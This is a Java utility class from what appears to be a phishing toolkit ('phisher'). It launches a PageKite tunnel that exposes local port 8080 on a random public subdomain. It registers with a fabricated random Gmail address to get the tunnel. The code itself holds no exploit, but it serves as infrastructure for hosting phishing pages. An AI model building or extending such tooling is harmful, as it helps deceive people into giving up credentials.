package com.shaw.phisher.utils;

import org.springframework.beans.factory.annotation.Value;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;
import java.util.Random;

public class Command {
    @Value("pageKite.email")
    public String pageKiteEmail;

    public static String inputFilePath = System.getProperty("user.home") + "/.phisher/.config";
    public static String pageKiteFilePath = System.getProperty("user.home") + "/.phisher/pagekite.py";
    public static Process execute(String command) throws IOException {
        return Runtime.getRuntime().exec(new String[]{command});
    }

    public static String getRandom(int digits){
        StringBuilder random30 = new StringBuilder();
        Random random = new Random();
        for(int i=0;i<digits;i++){
            random30.append(random.nextInt(10));
        }
        System.out.println(random30.toString());
        return random30.toString();
    }
    public static void executePageKite() {
        Operations.writeFile(inputFilePath, "\n"+getRandom(30)+"@gmail.com"+"\n\n\n"+"n\n");
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"C:\\Users\\8888h\\AppData\\Local\\Programs\\Python\\Python311\\python "+pageKiteFilePath+" 8080 "+getRandom(10)+".pagekite.me < "+inputFilePath+"\"");
//           processBuilder.redirectInput(new File(inputFilePath));
//           processBuilder.redirectOutput(ProcessBuilder.Redirect.INHERIT);

             Process process = processBuilder.start();

//            process.waitFor();
//            BufferedReader buf = new BufferedReader(new InputStreamReader(process.getInputStream()));
//            String line = "";
//            StringBuilder output = new StringBuilder();
//
//            while ((line = buf.readLine()) != null) {
//                output.append(line).append("\n");
//            }
//
//            System.out.println(output);
        }catch (Exception e){
            System.out.println(e);
        }
    }
}
